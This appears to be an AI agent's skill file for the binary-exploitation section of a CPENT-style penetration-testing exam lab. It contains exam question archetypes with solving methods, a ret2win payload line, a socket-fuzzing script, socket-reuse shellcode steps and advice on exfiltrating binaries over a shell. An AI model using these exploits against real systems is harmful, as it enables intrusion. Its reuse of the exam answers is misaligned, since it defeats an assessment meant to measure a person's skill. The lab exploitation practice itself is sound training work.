# Zone 5 — Binary exploitation (filtered segment)

Prior range: `172.25.65.0/24` (excl `.250` = the **filtering device**). A
foothold host is given (SSH creds); vulnerable binaries are served via
`socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/path/binary` on internal hosts.
Full evidence (PRIVATE, do not share): `~/.config/opencode/skills/cpent-exam/private/CPENT_Binary_Writeup.md`.
Load with: `ctf-pwn`. Tools: toolkit.md §6 (pattern_create.rb paths!).

## Egress rule — decide payload style FIRST

The excluded host filters **egress** from the segment: reverse shells to tun0
never connect. Verify quickly (`nc -lvnp 443` on attacker, trigger target
callback), then commit to **socket-reuse shellcode**: dup2 the already-accepted
fd (often 4) to 0/1/2, then `execve("/bin/sh")`. You keep the same TCP connection
the service gave you.

## Question archetypes and their answers

| Question | Method |
|---|---|
| **File hash (v2-documented)** | `md5sum <file>` / `sha256sum` / `sha512sum` — exact which algo, paste carefully |
| **ret2libc (v2-documented)** | NX on + ASLR: leak libc via puts(puts@got) → compute base → `pop rdi; ret` + `/bin/sh` + `system`; offsets via `~/tools/libc-database` |
| Hex value in EIP during fuzz | `pattern_create.rb -l 200` → feed → gdb `info registers eip` |
| Offset to return address | `pattern_offset.rb -l 200 -q <eip>` — verify vs disassembly (`buf` at `ebp-0x6c` → 108+4) |
| Padding to saved RIP (x64) | length oracle: last length that still prints "finished normally" +1 (prior: 71 ok, 72 corrupts) |
| Hidden function name | strings/symbols; classic ret2win `win` |
| Full win address | brute-force no-PIE .text bytewise; entry matters (prologue sets rbp the flag read uses — 0x401186 works, 0x401188 does not) |
| Flag chars excluding brackets | print file via win, count carefully (`flag{...}` → minus the 2 braces) |
| PE algorithm question | `upx -d`, then radare2/objdump; "every 2nd digit doubled, >9 −9, sum%10==0" = **Luhn** |
| Hex divisor in checksum | magic-multiply `0x66666667` implements division by **0x0A** |

## Exploit patterns that worked

**32-bit, NX off, stack leak in banner (ret2shellcode + socket-reuse):**
```
1. read banner → parse leaked buffer address L (changes per connection)
2. payload = NOP-sled + socket-reuse-shellcode, pad to 96, then L repeated ×30
   (spray L over saved EIP region; any landing = NOP sled)
3. shell arrives on the same socket
```
Exfiltrate binaries by `base64 -w0` over that shell.

**x86-64, NX on, no-PIE (ret2win):**
```python
payload = b"A"*72 + struct.pack("<Q", 0x401186) + b"\n"   # offset from oracle
```
Brute force the win address if symbols stripped: iterate candidate addresses,
stop when the response contains "flag".

## Fuzzing the remote service (raw sockets)

```python
import socket
for n in range(1, 200):
    s = socket.create_connection((IP, 1337)); s.settimeout(2)
    s.send(b"A"*n + b"\n")
    ok = b"finished normally" in s.recv(4096)
    print(n, ok)          # last True + 1 = padding length
```

## Local reproduction

Copy the binary out (`scp` via given foothold, or base64 over socket) and:
`checksec --file=bin`; replicate the service with
`socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./bin` for debugger-driven offset work;
core dumps in gdb: `run < pat.txt` → `info registers eip`.

## Gotchas

- ASLR per-connection: leaks are single-use; re-parse per attempt.
- Don't assume offset from EIP fuzz = offset for x64 saved RIP (112 vs 72 in prior
  range — different binaries, different frames).
- "Full hex address" wants `0x0000000000401186` (16 hex digits), not `0x401186`.
- Excluded host `.250` = filter. Don't scan it; don't waste time on reverse shells.
